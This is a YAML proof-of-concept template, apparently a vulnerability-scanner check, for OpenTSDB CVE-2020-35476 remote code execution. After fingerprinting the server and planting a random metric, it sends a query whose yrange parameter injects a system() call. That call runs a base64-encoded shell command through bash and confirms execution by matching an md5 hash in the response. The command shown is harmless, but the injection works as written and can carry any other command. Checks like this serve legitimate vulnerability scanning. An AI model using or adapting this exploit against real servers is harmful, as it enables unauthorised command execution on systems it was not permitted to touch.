name: poc-yaml-opentsdb-cve-2020-35476-rce
set:
  r1: randomLowercase(3)
  r2: randomLowercase(3)
  r3: randomLowercase(3)
  r4: randomInt(1024, 65535)
rules:
  - method: GET
    path: "/s/opentsdb_header.jpg"
    follow_redirects: false
    expression: |
      response.status == 200 && response.content_type.contains("text/plain") && response.body.bcontains(b"\xff\xd8\xff\xe1")
  - method: POST
    body: |-
      [
          {
              "metric": "{{r1}}.{{r2}}.{{r3}}",
              "timestamp": 1608700420,
              "value": {{r4}},
              "tags": {
                 "host": "web01",
                 "dc": "lga"
              }
          },
          {
              "metric": "{{r1}}.{{r2}}.{{r3}}",
              "timestamp": 1608700421,
              "value": {{r4}},
              "tags": {
                 "host": "web02",
                 "dc": "lga"
              }
          }
      ]
    path: "/api/put"
    follow_redirects: false
    expression: |
      sleep(5) && response.status == 204 && response.content_type.contains("json")
  - method: GET
    path: "/q?start=2000/10/21-00:00:00&end=2020/12/25-00:00:00&m=sum:{{r1}}.{{r2}}.{{r3}}&o=&yrange=[0:system('echo%20-e%20\"ZWNobyAxMjMgfG1kNXN1bSAxPiYyCg==\"%20|%20base64%20-d%20|bash')]&wxh=1698x316&style=linespoint&json"
    follow_redirects: false
    expression: |
      response.status == 400 && response.content_type.contains("json") && "ba1f2511fc30423bdbb183fe33f3dd0f".bmatches(response.body)

detail:
  author: mvhz81
  info: opentsdb-cve-2020-35476-rce
  links:
    - https://blog.csdn.net/xuandao_ahfengren/article/details/111402955
    - https://hub.docker.com/r/petergrace/opentsdb-docker